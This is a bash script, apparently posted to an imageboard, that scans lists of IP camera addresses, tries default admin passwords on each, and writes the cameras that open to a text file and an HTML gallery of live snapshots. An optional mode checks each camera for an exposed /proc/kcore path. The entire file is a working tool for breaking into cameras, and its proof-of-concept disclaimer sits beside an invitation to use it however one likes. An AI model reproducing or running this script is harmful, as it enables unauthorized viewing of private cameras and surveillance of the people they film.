#!/bin/bash
#
# By evil @ 8ch.net/ipcam/
#
# This is a proof of concept and is not intended to be used
# to gain unauthorized access to IP camera systems. Otherwise,
# do whatever the fuck you want with it.
#
# Load a list of IPs into a file, which will be your "in" list.
# For example, parisfrance-in.txt. Use the format
# http://123.456.789.000:8080... one IP per line, no trailing /.
# We use the ".txt" extension so Windows users can run this
# script with Cygwin.
#
# ./findcams.sh $ARGUMENT1 $ARGUMENT2 $ARGUMENT3
#
# $ARGUMENT1 => dokcore | nokcore
#
# $ARGUMENT2 => curl timeout, use "2" for fast and 4+ for long
# distances or slower connections. "2" means 2 seconds.
#
# $ARGUMENT3 => references your in and out file names, do not
# include "-in.txt" here. 
#
# EXAMPLE 1: Test a list of IPs but do not check for patched kcore
# $ ./findcams.sh nokcore 2 parisfrance
# Expects a filed called parisfrance-in.txt
# Will yield... parisfrance-default.txt and parisfrance-default.html 
#
# EXAMPLE 2: Test a list of IPs and check for patched kcore
# $ ./findcams.sh dokcore 2 parisfrance
# Expects a filed called parisfrance-in.txt
# Will yield the same as above plus parisfrance-kcore.txt, which will
# be a list of unpatched kcores.
# 
# Script will generate pipe delimited lists for each out file
#
# Default Out File: IP | USER | PASS
# Kcore Out File: IP | "kcore-found" | CAM_ALIAS

# HTML TOP
HTMLTOP="<html><head><title>Default PW Cam Previewer Thing</title></head><body>"

# HTML BOTTOM
HTMLBOTTOM="</body></html>"

echo "$HTMLTOP" >> "$3-default.html"

IPS="$(< $3-in.txt)"
for IP in $IPS; do
        TRY1="$(curl -sL -m $2 -w "%{http_code}" "$IP/videostream.cgi?user=admin&pwd=" -o /dev/null)"
        if [ "$TRY1" -eq 200 ]
                then
                echo "$IP | admin | nopw" >> "$3-default.txt"
                echo "<div style='border:1px solid #ccc;padding:8px;margin-bottom:8px;'><img style='width:320px;' src='$IP/snapshot.cgi?user=admin&pwd=' /><br /><b>Source:</b> $IP/videostream.cgi?user=admin&pwd=</div>" >> "$3-default.html"
        else
                TRY2="$(curl -sL -m $2 -w "%{http_code}" "$IP/videostream.cgi?user=admin&pwd=123456" -o /dev/null)"
                if [ "$TRY2" -eq 200 ]
                        then
                        echo "$IP | admin | 123456" >> "$3-default.txt"
                        echo "<div style='border:1px solid #ccc;padding:8px;margin-bottom:8px;'><img style='width:320px;' src='$IP/snapshot.cgi?user=admin&pwd=123456' /><b>Source:</b> $IP/videostream.cgi?user=admin&pwd=123456</div>" >> "$3-default.html"
                else
                        TRY3="$(curl -sL -m $2 -w "%{http_code}" "$IP/videostream.cgi?user=admin&pwd=12345" -o /dev/null)"
                        if [ "$TRY3" -eq 200 ]
                                then
                                echo "$IP | admin | 12345" >> "$3-default.txt"
                                echo "<div style='border:1px solid #ccc;padding:8px;margin-bottom:8px;'><img style='width:320px;' src='$IP/snapshot.cgi?user=admin&pwd=12345' /><b>Source:</b> $IP/videostream.cgi?user=admin&pwd=12345</div>" >> "$3-default.html"
                        else
                                if [ "$1" = "dokcore" ]
                                        then
                                        TRYKCORE="$(curl -sL -m $2 -w "%{http_code}" "$IP//proc/kcore" -o /dev/null)"
                                        if [ "$TRYKCORE" -eq 200 ]
                                                then
                                                CAMALIAS="$(curl -sL -m 4 $IP/get_status.cgi | grep 'var alias=*')"
                                                CAMALIAS=${CAMALIAS#*=}
                                                CAMALIAS=${CAMALIAS%;}
                                                echo "$IP | kcore-found | $CAMALIAS" >> "$3-kcore.txt"
                                        fi
                                fi
                        fi
                fi
        fi
done

echo $HTMLBOTTOM >> "$3-default.html"
